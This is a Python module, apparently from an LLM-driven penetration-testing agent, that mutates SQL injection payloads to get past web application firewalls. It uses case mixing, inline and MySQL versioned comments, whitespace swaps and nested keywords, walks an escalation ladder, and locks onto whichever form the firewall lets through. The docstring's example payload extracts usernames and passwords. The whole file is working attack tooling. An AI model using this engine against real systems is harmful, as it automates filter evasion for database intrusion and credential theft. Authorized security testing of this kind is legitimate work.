"""Evasion grammar: semantics-preserving, token-aware surface transforms for SQLi payloads,
plus an online WAF profile that locks a working surface form and never resends the same bytes.

Design rationale (the project's novelty): the LLM plans WHAT to do (methodology step, base
payload); this deterministic grammar mutates HOW it looks on the wire. Small local models are
poor at hand-writing valid obfuscated SQL — they corrupt identifiers (e.g. `p/**/a/**/ss/**/word`)
and loop on the same string. Delegating mutation to code keeps every payload valid and lets the
agent fingerprint the WAF by trying named transforms and recording which ones pass.

A "base payload" is a plain, valid injection the methodology produced, e.g.
    1' UNION SELECT user,password FROM users-- -
Invariants a base must satisfy for the transforms to stay valid:
  * tokens are separated by single ASCII spaces,
  * quoted string literals contain no spaces,
  * any trailing comment is `-- -` (dash dash space ...) or `#...`.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Callable, Optional

from .knowledge import bypass_ladder as _kb_ladder

# SQL keywords the transforms are allowed to touch. Matched as whole words, case-insensitively.
_KEYWORDS = (
    "UNION", "SELECT", "ALL", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
    "GROUP", "CONCAT", "GROUP_CONCAT", "LIMIT", "INFORMATION_SCHEMA", "TABLES", "COLUMNS",
)
_KW_RE = re.compile(r"\b(" + "|".join(sorted(_KEYWORDS, key=len, reverse=True)) + r")\b", re.IGNORECASE)

# A trailing SQL comment: optional leading space, then `-- ` / `--`(eol) / `#...` to end of string.
_COMMENT_RE = re.compile(r"(\s*(?:--\s.*|--$|#.*))$")


def _split_comment(payload: str) -> tuple[str, str]:
    """Separate the body from a trailing SQL comment so transforms never mangle the comment."""
    m = _COMMENT_RE.search(payload)
    if m:
        return payload[: m.start()], payload[m.start():]
    return payload, ""


def _mixed_case(word: str) -> str:
    """Deterministic alternating case (UNION -> UnIoN). Defeats case-sensitive signatures while
    staying reproducible — important for the benchmark and for the engine's de-duplication."""
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word))


# --- Transforms: each is str -> str, semantics-preserving on a real DB (except double_keyword). ---

def t_identity(p: str) -> str:
    return p


def t_case(p: str) -> str:
    """Randomise the case of SQL keywords only (identifiers and literals are left untouched)."""
    body, comment = _split_comment(p)
    return _KW_RE.sub(lambda m: _mixed_case(m.group(0)), body) + comment


def t_union_all(p: str) -> str:
    """`UNION SELECT` -> `UNION ALL SELECT` (a different signature, same result set here)."""
    body, comment = _split_comment(p)
    body = re.sub(r"\bUNION\b\s+\bSELECT\b", "UNION ALL SELECT", body, flags=re.IGNORECASE)
    return body + comment


def t_inline_comment(p: str) -> str:
    """Replace inter-token whitespace with `/**/`. Only whitespace is touched, so identifiers
    such as `password` and `user,password` stay contiguous."""
    body, comment = _split_comment(p)
    return re.sub(r"\s+", "/**/", body) + comment


def t_whitespace_tab(p: str) -> str:
    body, comment = _split_comment(p)
    return re.sub(r" ", "\t", body) + comment


def t_whitespace_newline(p: str) -> str:
    body, comment = _split_comment(p)
    return re.sub(r" ", "\n", body) + comment


def t_versioned_comment(p: str) -> str:
    """Wrap keywords in MySQL versioned comments: `UNION` -> `/*!50000UNION*/` (executed by MySQL,
    often missed by naive signatures)."""
    body, comment = _split_comment(p)
    return _KW_RE.sub(lambda m: f"/*!50000{m.group(0)}*/", body) + comment


def t_term_hash(p: str) -> str:
    """Swap the trailing comment terminator to `#` (no-op if there is no comment)."""
    body, comment = _split_comment(p)
    return body + "#" if comment else p


def t_term_dash(p: str) -> str:
    body, comment = _split_comment(p)
    return body + "-- -" if comment else p


def t_double_keyword(p: str) -> str:
    """Nest each keyword inside itself (`UNION` -> `UNIunionON`). ONLY valid against WAFs that
    strip the keyword once; otherwise the DB rejects it. Conditional / last-resort."""
    body, comment = _split_comment(p)

    def nest(m: re.Match) -> str:
        w = m.group(0)
        mid = len(w) // 2
        return w[:mid] + w.lower() + w[mid:]

    return _KW_RE.sub(nest, body) + comment


# name -> (function, semantics_safe). `double_keyword` is unsafe (depends on WAF behaviour).
TRANSFORMS: dict[str, tuple[Callable[[str], str], bool]] = {
    "identity": (t_identity, True),
    "case": (t_case, True),
    "union_all": (t_union_all, True),
    "inline_comment": (t_inline_comment, True),
    "whitespace_tab": (t_whitespace_tab, True),
    "whitespace_newline": (t_whitespace_newline, True),
    "versioned_comment": (t_versioned_comment, True),
    "term_hash": (t_term_hash, True),
    "term_dash": (t_term_dash, True),
    "double_keyword": (t_double_keyword, False),
}

Pipeline = tuple[str, ...]


def apply_pipeline(payload: str, pipeline: Pipeline) -> str:
    out = payload
    for name in pipeline:
        func, _ = TRANSFORMS[name]
        out = func(out)
    return out


# Escalation ladder: light, high-value, semantics-safe pipelines first; the conditional
# `double_keyword` last. Structure-changing transforms precede `case` so casing is applied last.
LADDER: tuple[Pipeline, ...] = (
    (),
    ("case",),
    ("inline_comment",),
    ("inline_comment", "case"),
    ("union_all", "case"),
    ("union_all", "inline_comment", "case"),
    ("versioned_comment",),
    ("versioned_comment", "case"),
    ("term_hash", "inline_comment", "case"),
    ("whitespace_tab",),
    ("whitespace_newline",),
    ("whitespace_tab", "case"),
    ("union_all", "versioned_comment", "case"),
    ("double_keyword",),
    ("double_keyword", "inline_comment", "case"),
)


@dataclass
class WafProfile:
    """What the agent has learned about THIS target's WAF during the current engagement."""

    tried_payloads: set[str] = field(default_factory=set)
    blocked_pipelines: list[Pipeline] = field(default_factory=list)
    passed_pipelines: list[Pipeline] = field(default_factory=list)
    locked_pipeline: Optional[Pipeline] = None  # first surface form the WAF let through

    def record(self, pipeline: Pipeline, payload: str, blocked: bool) -> None:
        self.tried_payloads.add(payload)
        if blocked:
            self.blocked_pipelines.append(pipeline)
        else:
            self.passed_pipelines.append(pipeline)
            if self.locked_pipeline is None:
                self.locked_pipeline = pipeline

    def summary(self) -> dict:
        return {
            # the plain pipeline () is a valid locked state, so test for None explicitly
            "locked_pipeline": list(self.locked_pipeline) if self.locked_pipeline is not None else None,
            "blocked_count": len(self.blocked_pipelines),
            "passed_count": len(self.passed_pipelines),
            "payloads_tried": len(self.tried_payloads),
        }


class EvasionEngine:
    """Turns a base payload into the next surface form to try, learning from WAF feedback.

    Policy:
      * Once a pipeline has passed the WAF it is *locked*; new base payloads are sent through it
        first (reuse the working evasion while the methodology varies the SQL).
      * Otherwise walk the escalation ladder, skipping any pipeline whose result was already sent.
      * `next_payload` returns (payload, pipeline) or (None, None) when the ladder is exhausted.
    """

    def __init__(self, ladder: Optional[tuple[Pipeline, ...]] = None) -> None:
        # La escalera se ALIMENTA del dataset (knowledge/bypass_ladder); si falta o trae un
        # transform inválido, se filtra y se cae a la LADDER determinista por defecto.
        source = ladder if ladder is not None else _kb_ladder()
        valid = tuple(tuple(p) for p in source if all(n in TRANSFORMS for n in p))
        self.ladder = valid or LADDER
        self.profile = WafProfile()

    def next_payload(self, base: str) -> tuple[Optional[str], Optional[Pipeline]]:
        # Reuse a known-good surface form first.
        if self.profile.locked_pipeline is not None:
            payload = apply_pipeline(base, self.profile.locked_pipeline)
            if payload not in self.profile.tried_payloads:
                return payload, self.profile.locked_pipeline
        # Otherwise escalate through the ladder, skipping bytes we have already sent.
        for pipeline in self.ladder:
            payload = apply_pipeline(base, pipeline)
            if payload not in self.profile.tried_payloads:
                return payload, pipeline
        return None, None

    def record(self, pipeline: Pipeline, payload: str, blocked: bool) -> None:
        self.profile.record(pipeline, payload, blocked)
